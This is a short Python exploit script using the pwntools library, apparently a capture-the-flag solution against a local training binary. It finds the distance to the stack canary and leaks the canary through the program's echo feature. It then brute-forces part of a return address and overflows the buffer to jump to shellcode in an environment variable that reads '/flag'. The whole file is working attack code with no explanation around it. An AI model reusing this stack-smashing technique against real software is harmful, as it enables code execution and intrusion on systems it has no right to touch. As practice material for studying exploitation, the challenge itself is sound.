import pwn

pwn.context.arch='x86_64'


shellcode = pwn.asm(pwn.shellcraft.readfile("/flag",1))
env = {"SHELLCODE":shellcode}

distance_to_canary = 0

for i in range(125):
    p = pwn.process("./toddler1_level2_testing1",env=env)
    p.sendline(str(1000))
    p.send(b"A"*8*i)
    r = p.clean()    
    if b"***" in r:
        distance_to_canary = 8*(i-1)
        break


while True:
    shell_addr = b"\x90\xcf"
    p = pwn.process("./toddler1_level2_teaching1",env=env)
    p.sendline(str(1000))
    p.send(b"REPEATAA"+b"A"*(distance_to_canary-8)+b"a")
    p.recvuntil(b"Aa")
    canary = p.readline()[:7]
    canary = b"\x00" + canary
    p.sendline(str(1000))
    p.send(b"REPEATAA" + b"A"*distance_to_canary+b"aa")
    p.recvuntil(b"aa")
    aslr = p.readline()[:4]
    shell_addr = shell_addr + aslr
    p.sendline(str(1000))
    p.send(b"A"*distance_to_canary+canary+b"A"*8+shell_addr)
    r = p.clean()
    if b"pwn" in r:
        print(r[r.find(b"pwn"):])
        break
